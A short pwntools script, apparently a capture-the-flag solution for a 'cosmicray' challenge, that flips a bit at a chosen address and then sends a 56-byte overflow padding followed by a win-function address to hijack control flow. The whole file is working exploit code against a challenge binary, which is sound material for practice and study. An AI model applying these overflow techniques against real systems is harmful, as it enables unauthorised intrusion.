#!/usr/bin/env python3

from pwn import *

exe = ELF("./cosmicray_patched")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        io = process([exe.path])
        if args.DEBUG:
            print(exe.path)
            io = gdb.debug(exe.path, "start")
    else:
        io = remote("chals.sekai.team", 4077)

    return io


def main():
    io = conn()
    offset = 56
    je_addr = 0x4016f4
    win_addr = 0x00000000004012db

    io.recvuntil(b':\n')
    io.sendline(b'0x4016f4')

    io.recvuntil(b':\n')
    io.sendline(b'7')

    io.recvuntil(b':\n')
    io.sendline(b'A' * offset + pack(win_addr))

    # good luck pwning :)

    io.interactive()


if __name__ == "__main__":
    main()
# RBP: 0x7fff7f23b5b0 

# RBP: 0x7fff3a026730